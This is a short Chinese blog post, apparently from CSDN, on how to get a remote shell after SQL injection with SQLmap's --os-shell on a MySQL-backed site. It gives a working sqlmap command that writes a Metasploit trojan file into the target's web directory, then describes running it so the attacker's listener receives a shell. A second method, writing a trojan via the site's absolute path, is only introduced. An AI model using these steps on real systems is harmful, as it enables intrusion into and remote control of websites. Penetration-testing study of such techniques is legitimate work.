**目录**

[方法一：直接写入木马，执行](#t0)

[方法二：找到网站绝对路径，写入木马](#t1)

* * *

> **利用场景**：当前是 root 用户，且通过 --os-shell 可以执行一部分少数的命令，很多命令没有回显，也不能执行[powershell](https://so.csdn.net/so/search?q=powershell&spm=1001.2101.3001.7020)命令反弹木马。

![](https://img-blog.csdnimg.cn/20200421111304145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200421101411532.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 方法一：直接写入木马，执行

由于通过SQLmap注入MySQL类型的网站，--os-shell 参数无法执行远程下载的命令，所以我们可以本地写入[木马](https://so.csdn.net/so/search?q=%E6%9C%A8%E9%A9%AC&spm=1001.2101.3001.7020)文件。

```
sqlmap -u "http://192.168.10.20:88/index.php?id=1" -p id --dbms="MySQL" --batch --file-write msf.exe --file-dest "C:\phpstudy\WWW\msf.exe"
```


![](https://img-blog.csdnimg.cn/20200507110721846.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后通过os-shell直接执行该msf.exe木马文件，我们的MSF就可以收到shell了。

![](https://img-blog.csdnimg.cn/20200507110828944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 方法二：找到网站绝对路径，写入木马

如果第一种方法不能执行木马文件或者执行完之后我们收不到shell。这种情况的话，就必须得找到网站绝对路径写入木马了。